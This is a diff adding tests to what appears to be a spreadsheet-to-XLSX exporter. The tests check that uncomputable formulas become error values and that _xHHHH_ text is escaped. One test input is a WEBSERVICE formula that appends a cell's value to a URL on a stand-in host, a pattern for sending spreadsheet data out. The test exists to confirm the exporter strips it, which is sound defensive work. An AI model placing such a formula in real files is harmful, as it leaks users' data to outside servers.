@@ -150,6 +150,35 @@ describe("sheetXlsxBytes", () => {
   });
 });
 
+describe("what a reader could run or misread", () => {
+  it("never writes a formula the server does not compute, only its error value", () => {
+    const doc = structuredClone(DOC);
+    const cells = doc.sheets[0]!.cells;
+    cells["E1"] = { value: null, formula: '=WEBSERVICE("https://example.invalid/"&A1)' };
+    cells["E2"] = { value: null, formula: "=SUM(AA1:AA2)" };
+    cells["E3"] = { value: null, formula: "=1+" };
+    cells["E4"] = { value: null, formula: "=SUM(B1:B2)+FOO(1)" };
+    const sheet = unzip(sheetXlsxBytes(doc)).get("xl/worksheets/sheet1.xml") ?? "";
+    expect(sheet).not.toMatch(/WEBSERVICE|FOO|AA1/u);
+    expect(sheet).toContain('<c r="E1" t="e"><v>#VALUE!</v></c>');
+    expect(sheet).toContain('<c r="E2" t="e"><v>#REF!</v></c>');
+    expect(sheet).toContain('<c r="E3" t="e"><v>#VALUE!</v></c>');
+    expect(sheet).toContain('<c r="E4" t="e"><v>#NAME?</v></c>');
+    expect(sheet).toContain("<f>SUM(B1:B2)</f>");
+  });
+
+  it("escapes a literal _xHHHH_ in text, a computed text and a sheet name", () => {
+    const doc = structuredClone(DOC);
+    doc.sheets[0]!.cells["E1"] = { value: "_x0041_ i _X00ff_ ali _x41_" };
+    doc.sheets[0]!.cells["E2"] = { value: null, formula: '="_x0041_"' };
+    doc.sheets[1]!.name = "_x0042_";
+    const parts = unzip(sheetXlsxBytes(doc));
+    expect(parts.get("xl/sharedStrings.xml")).toContain("_x005F_x0041_ i _x005F_X00ff_ ali _x41_");
+    expect(parts.get("xl/worksheets/sheet1.xml")).toContain("<v>_x005F_x0041_</v>");
+    expect(parts.get("xl/workbook.xml")).toContain('name="_x005F_x0042_"');
+  });
+});
+
 describe("formulaForFile", () => {
   it("drops the equals sign and capitalises outside text literals only", () => {
     expect(formulaForFile('=if(a1="ab""c",round(b2,2),0)')).toBe('IF(A1="ab""c",ROUND(B2,2),0)');
